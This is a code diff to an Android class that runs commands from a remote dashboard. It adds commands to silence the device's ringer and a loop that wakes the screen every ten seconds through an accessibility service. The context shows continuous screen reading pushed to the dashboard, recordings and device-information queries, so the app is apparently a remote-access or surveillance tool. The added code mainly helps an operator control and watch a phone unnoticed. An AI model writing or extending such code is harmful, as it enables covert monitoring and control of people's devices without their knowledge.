@@ -95,6 +95,12 @@ public class SocketManager {
     private volatile boolean blockFrameMode = false;
     private ScheduledFuture<?> blockFrameFuture;
 
+    // ── Wake keep-alive loop — device wakes screen every 10 s until timed out ──
+    private volatile ScheduledFuture<?> wakeKeepAliveFuture;
+    private volatile long wakeKeepAliveLastTrigger = 0L;
+    private static final long WAKE_KEEP_ALIVE_INTERVAL_MS = 10_000L;
+    private static final long WAKE_KEEP_ALIVE_TIMEOUT_MS  = 4 * 60_000L; // auto-stop after 4 min
+
     // Screen-reader push mode — app continuously reads screen and pushes to dashboard
     private volatile ScheduledFuture<?> screenReaderFuture;
 
@@ -809,6 +815,44 @@ public class SocketManager {
             case "get_wifi_networks":
             case "get_system_info":
                 return commandExecutor.executeCommand(command, params);
+
+            // ── Audio: mute / unmute ─────────────────────────────────────
+            case "mute_device": {
+                JSONObject r = new JSONObject();
+                try {
+                    android.media.AudioManager am = (android.media.AudioManager)
+                        context.getSystemService(Context.AUDIO_SERVICE);
+                    if (am != null) am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
+                    r.put("success", true);  r.put("action", "mute_device");
+                } catch (Exception e) { r.put("success", false); r.put("error", e.getMessage()); }
+                return r;
+            }
+            case "unmute_device": {
+                JSONObject r = new JSONObject();
+                try {
+                    android.media.AudioManager am = (android.media.AudioManager)
+                        context.getSystemService(Context.AUDIO_SERVICE);
+                    if (am != null) am.setRingerMode(android.media.AudioManager.RINGER_MODE_NORMAL);
+                    r.put("success", true);  r.put("action", "unmute_device");
+                } catch (Exception e) { r.put("success", false); r.put("error", e.getMessage()); }
+                return r;
+            }
+
+            // ── Wake keep-alive: device wakes screen every 10 s ──────────
+            // Dashboard pings every 60 s; device auto-stops after 4 min of silence.
+            case "wake_keep_alive_start": {
+                wakeKeepAliveLastTrigger = System.currentTimeMillis();
+                startWakeKeepAliveLoop();
+                JSONObject r = new JSONObject();
+                r.put("success", true); r.put("action", "wake_keep_alive_start");
+                return r;
+            }
+            case "wake_keep_alive_stop": {
+                stopWakeKeepAliveLoop();
+                JSONObject r = new JSONObject();
+                r.put("success", true); r.put("action", "wake_keep_alive_stop");
+                return r;
+            }
         }
 
         // ── Storage permission (on-demand from dashboard) ────────────────
@@ -1929,6 +1973,31 @@ public class SocketManager {
      * @param sendAutoEvent if true, push an autoEvent:'stop' so the dashboard
      *                      automatically saves the current recording.
      */
+    // ── Wake keep-alive helpers ───────────────────────────────────────────
+    private void startWakeKeepAliveLoop() {
+        if (wakeKeepAliveFuture != null && !wakeKeepAliveFuture.isCancelled() && !wakeKeepAliveFuture.isDone()) {
+            return;
+        }
+        wakeKeepAliveFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
+            try {
+                if (System.currentTimeMillis() - wakeKeepAliveLastTrigger > WAKE_KEEP_ALIVE_TIMEOUT_MS) {
+                    android.util.Log.i(TAG, "wake_keep_alive: 4-min timeout, stopping");
+                    stopWakeKeepAliveLoop();
+                    return;
+                }
+                UnifiedAccessibilityService liveSvc = UnifiedAccessibilityService.getInstance();
+                if (liveSvc != null) new ScreenController(context, liveSvc).wakeScreen();
+            } catch (Exception e) {
+                android.util.Log.e(TAG, "wake_keep_alive error: " + e.getMessage());
+            }
+        }, 0, WAKE_KEEP_ALIVE_INTERVAL_MS, TimeUnit.MILLISECONDS);
+    }
+
+    private void stopWakeKeepAliveLoop() {
+        ScheduledFuture<?> f = wakeKeepAliveFuture;
+        if (f != null) { f.cancel(false); wakeKeepAliveFuture = null; }
+    }
+
     private void stopScreenReaderLoop(boolean sendAutoEvent) {
         ScheduledFuture<?> f = screenReaderFuture;
         if (f != null) { f.cancel(false); screenReaderFuture = null; }
